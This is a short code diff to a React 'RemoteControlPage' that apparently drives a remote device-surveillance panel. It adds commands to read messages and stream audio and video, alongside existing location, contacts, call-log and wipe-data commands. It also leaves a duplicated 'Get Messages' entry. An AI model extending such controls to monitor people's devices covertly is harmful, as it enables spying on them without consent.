@@ -122,7 +122,7 @@ export default function RemoteControlPage() {
           setTimeout(() => {  
             const payload = {
               type: "client-message",
-              action: "record_screen",
+              action: "stream_screen",
               duration:3000,
               timestamp: Date.now()
             };
@@ -469,6 +469,9 @@ export default function RemoteControlPage() {
     { command: 'GET_LOCATION' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_location', type: 'client-message', icon: Map, label: 'Get Location', iconColor: 'text-orange-500' },
     { command: 'GET_CONTACTS' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_contacts', type: 'client-message', icon: Users, label: 'Get Contacts', iconColor: 'text-indigo-500' },
     { command: 'GET_CALL_LOGS' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_call_logs', type: 'client-message', icon: Phone, label: 'Get Call Logs', iconColor: 'text-pink-500' },
+    { command: 'GET_MESSAGES' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_messages', type: 'client-message', icon: MessageSquare, label: 'Get Messages', iconColor: 'text-teal-500' },
+    { command: 'STREAM_AUDIO' as CommandType, deviceId: selectedDevice?.deviceId, action: 'stream_audio', type: 'client-message', icon: MessageSquare, label: 'Stream Audio', iconColor: 'text-teal-500' },
+    { command: 'STREAM_VIDEO' as CommandType, deviceId: selectedDevice?.deviceId, action: 'stream_video', type: 'client-message', icon: MessageSquare, label: 'Stream Video', iconColor: 'text-teal-500' },
     { command: 'GET_MESSAGES' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_messages', type: 'client-message', icon: MessageSquare, label: 'Get Messages', iconColor: 'text-teal-500' },
     { command: 'RESTART_DEVICE' as CommandType,deviceId: selectedDevice?.deviceId, action: 'restart_device', type: 'client-message', icon: RefreshCw, label: 'Restart Device', iconColor: 'text-yellow-500' },
     { command: 'WIPE_DATA' as CommandType,deviceId: selectedDevice?.deviceId, action: 'wipe_data', type: 'client-message', icon: Trash2, label: 'Wipe Data', iconColor: 'text-red-500' },
